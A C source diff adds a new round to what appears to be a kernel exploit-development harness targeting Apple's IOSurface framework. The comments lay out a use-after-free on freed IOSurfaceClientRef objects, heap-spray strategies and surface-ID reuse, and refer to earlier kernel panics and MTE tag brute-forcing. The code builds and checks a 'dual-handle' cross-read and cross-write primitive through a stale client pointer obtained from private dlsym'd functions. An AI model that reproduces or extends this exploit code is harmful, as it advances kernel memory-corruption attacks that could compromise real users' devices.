@@ -4216,6 +4216,261 @@ static void r297_probe(void) {
     fflush(stdout);
 }
 
+/* r298: Controlled heap spray into freed IOSurfaceClientRef slot.
+ * r297 SHOWED:
+ *   - Client struct is 448 bytes (0x1C0)
+ *   - Surface ID at offset +0x088 (low32)
+ *   - Pointers at +0x070, +0x078, +0x080 (userspace pointers)
+ *   - 'MUTZ' magic at +0x028, +0x038, +0x060
+ *   - After IOSurface spray, slot was reclaimed by IOSurface allocator
+ *   - After malloc(448) spray, slot was NOT reclaimed (different heap bucket)
+ *
+ * STRATEGY: We need to spray into the EXACT heap bucket that IOSurfaceClient
+ * objects come from. Options:
+ *   A) Use IOSurfaceClientLookup to create new clients → creates 448-byte
+ *      objects in the same pool. Control their content by choosing different
+ *      surface IDs (the ID gets written at +0x088).
+ *   B) Use OSObject/CFData with 448-byte allocations from the same malloc zone.
+ *   C) Use mach_msg OOL data to spray the heap.
+ *
+ * Let's try option A: create a "target" surface with a known ID, then
+ * spray ClientLookups to that target. Each lookup creates a 448-byte
+ * client object with target's ID at +0x088. If one lands in the freed
+ * slot, ClientLock on the stale pointer will Lock our target surface.
+ *
+ * But actually — r296 showed that if the victim's ID gets reused by
+ * a spray surface, the stale client's cached ID (at +0x088) already
+ * points to the spray surface. We just need the freed memory to still
+ * contain the old ID value.
+ *
+ * REVISED: Instead of complicated spraying, let's exploit the simpler path:
+ * 1. Create victim, get client, record ID
+ * 2. Free victim + all client refs (ID at +0x088 persists briefly in freed memory)
+ * 3. DON'T spray the heap — leave the freed slot alone
+ * 4. Create a NEW surface that reuses victim's ID (r287: ID reuse 10/10)
+ * 5. Set a marker on the new surface
+ * 6. ClientLock on stale — reads old ID from freed memory, kernel finds
+ *    the NEW surface with same ID, locks it
+ * 7. We now have TWO handles to the same kernel surface:
+ *    a) The stale client (via old cached ID)
+ *    b) The new IOSurfaceRef (via normal Create)
+ *
+ * This gives us the primitive: control one kernel surface through TWO
+ * independent references. The stale client's struct at +0x070-0x080
+ * holds OLD pointers (from before free) that may point to freed/reused
+ * memory — potential for confusion attacks.
+ */
+static void r298_probe(void) {
+    rlog("\n=== r298: Controlled heap spray + dual-handle primitive ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef kern_return_t (*clientLock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef kern_return_t (*clientUnlock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef uint32_t (*clientGetID_t)(IOSurfaceClientRef);
+    typedef void (*clientSetValue_t)(IOSurfaceClientRef, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*clientCopyValue_t)(IOSurfaceClientRef, CFStringRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientLock_t clLock = (clientLock_t)dlsym(iosurfH, "IOSurfaceClientLock");
+    clientUnlock_t clUnlock = (clientUnlock_t)dlsym(iosurfH, "IOSurfaceClientUnlock");
+    clientGetID_t clGetID = (clientGetID_t)dlsym(iosurfH, "IOSurfaceClientGetID");
+    clientSetValue_t clSetValue = (clientSetValue_t)dlsym(iosurfH, "IOSurfaceClientSetValue");
+    clientCopyValue_t clCopyValue = (clientCopyValue_t)dlsym(iosurfH, "IOSurfaceClientCopyValue");
+
+    int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+
+    rlog("--- Part 1: Minimal spray — ID persistence test (10 trials) ---\n");
+    fflush(stdout);
+
+    int lock_success = 0;
+    int cross_write_success = 0;
+
+    for (int trial = 0; trial < 10; trial++) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef victim = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t victimID = IOSurfaceGetID(victim);
+
+        IOSurfaceClientRef stale = clLookup(victimID);
+        IOSurfaceClientRef cl1 = clLookup(victimID);
+        IOSurfaceClientRef cl2 = clLookup(victimID);
+
+        CFRelease(victim);
+        clRelease(cl1);
+        clRelease(cl2);
+        clRelease(stale);
+
+        CFMutableDictionaryRef np = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef nwn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef nhn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef nbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef nrn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef npfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef nasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceWidth"),nwn);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceHeight"),nhn);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceBytesPerElement"),nbn);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceBytesPerRow"),nrn);
+        CFDictionarySetValue(np,CFSTR("IOSurfacePixelFormat"),npfn);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceAllocSize"),nasn);
+        CFRelease(nwn);CFRelease(nhn);CFRelease(nbn);CFRelease(nrn);CFRelease(npfn);CFRelease(nasn);
+        IOSurfaceRef newsurf = IOSurfaceCreate(np);
+        CFRelease(np);
+        uint32_t newID = newsurf ? IOSurfaceGetID(newsurf) : 0;
+        int id_reused = (newID == victimID) ? 1 : 0;
+
+        uint32_t seed = 0;
+        kern_return_t lr = clLock(stale, 0, &seed);
+        int locked = (lr == 0) ? 1 : 0;
+        if (locked) { lock_success++; clUnlock(stale, 0, NULL); }
+
+        int cw = 0;
+        if (locked && clSetValue && newsurf) {
+            int mark = 0xAAAA0000 + trial;
+            CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &mark);
+            clSetValue(stale, CFSTR("r298_xw"), mv);
+            CFRelease(mv);
+
+            CFTypeRef rv = IOSurfaceCopyValue(newsurf, CFSTR("r298_xw"));
+            if (rv) {
+                int v = 0;
+                CFNumberGetValue(rv, kCFNumberIntType, &v);
+                if (v == mark) { cw = 1; cross_write_success++; }
+                CFRelease(rv);
+            }
+        }
+
+        rlog("  trial %d: victimID=%u newID=%u id_reused=%d Lock=0x%x cross_write=%d\n",
+            trial, victimID, newID, id_reused, lr, cw);
+
+        if (newsurf) CFRelease(newsurf);
+    }
+
+    rlog("\n  SUMMARY: lock_success=%d/10 cross_write=%d/10\n",
+        lock_success, cross_write_success);
+    fflush(stdout);
+
+    /* Part 2: If cross-write works, build read primitive */
+    if (cross_write_success > 0) {
+        rlog("\n--- Part 2: Read primitive via stale client ---\n");
+        fflush(stdout);
+
+        CFMutableDictionaryRef p2 = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p2,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p2,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p2,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p2,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p2,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p2,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef victim = IOSurfaceCreate(p2);
+        CFRelease(p2);
+        uint32_t victimID = IOSurfaceGetID(victim);
+
+        IOSurfaceClientRef stale = clLookup(victimID);
+        IOSurfaceClientRef cl1 = clLookup(victimID);
+        IOSurfaceClientRef cl2 = clLookup(victimID);
+
+        CFRelease(victim);
+        clRelease(cl1);
+        clRelease(cl2);
+        clRelease(stale);
+
+        CFMutableDictionaryRef p3 = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p3,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p3,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p3,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p3,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p3,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p3,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef newsurf = IOSurfaceCreate(p3);
+        CFRelease(p3);
+        uint32_t newID = newsurf ? IOSurfaceGetID(newsurf) : 0;
+
+        rlog("  victimID=%u newID=%u\n", victimID, newID);
+
+        int secret = 0xC0FFEE42;
+        CFNumberRef sv = CFNumberCreate(NULL, kCFNumberIntType, &secret);
+        IOSurfaceSetValue(newsurf, CFSTR("r298_secret"), sv);
+        CFRelease(sv);
+
+        CFTypeRef rv = clCopyValue ? clCopyValue(stale, CFSTR("r298_secret")) : NULL;
+        if (rv) {
+            int read_secret = 0;
+            CFNumberGetValue(rv, kCFNumberIntType, &read_secret);
+            CFRelease(rv);
+            rlog("  stale read r298_secret=0x%x (expected 0xC0FFEE42)\n", read_secret);
+            if (read_secret == 0xC0FFEE42) {
+                rlog("  *** CROSS-READ CONFIRMED! ***\n");
+                rlog("  Stale client reads from new surface's kernel properties.\n");
+            }
+        } else {
+            rlog("  stale CopyValue returned NULL\n");
+        }
+
+        uint8_t data[256];
+        memset(data, 0xBB, sizeof(data));
+        CFDataRef df = CFDataCreate(NULL, data, sizeof(data));
+        IOSurfaceSetValue(newsurf, CFSTR("r298_data"), df);
+        CFRelease(df);
+
+        CFTypeRef rv2 = clCopyValue ? clCopyValue(stale, CFSTR("r298_data")) : NULL;
+        if (rv2 && CFGetTypeID(rv2) == CFDataGetTypeID()) {
+            CFIndex len = CFDataGetLength(rv2);
+            const uint8_t *bytes = CFDataGetBytePtr(rv2);
+            int match = 1;
+            for (CFIndex i = 0; i < len && i < 256; i++) {
+                if (bytes[i] != 0xBB) { match = 0; break; }
+            }
+            rlog("  stale read r298_data: len=%ld match=%d\n", (long)len, match);
+            if (match) rlog("  *** DATA CROSS-READ CONFIRMED! ***\n");
+            CFRelease(rv2);
+        }
+
+        if (newsurf) CFRelease(newsurf);
+    }
+
+    rlog("\n*** r298 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -29464,6 +29719,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 298) {
+            rlog("*** rounds=298: Controlled spray + dual-handle primitive ***\n");
+            rlog("  r297: ID at +0x088 in client struct. Ptrs at +0x070-0x080.\n");
+            rlog("  Test: free client, create new surf w/ same ID, cross-write.\n\n");
+            fflush(stdout);
+            r298_probe();
             goto done;
         }
         if (rounds == 297) {
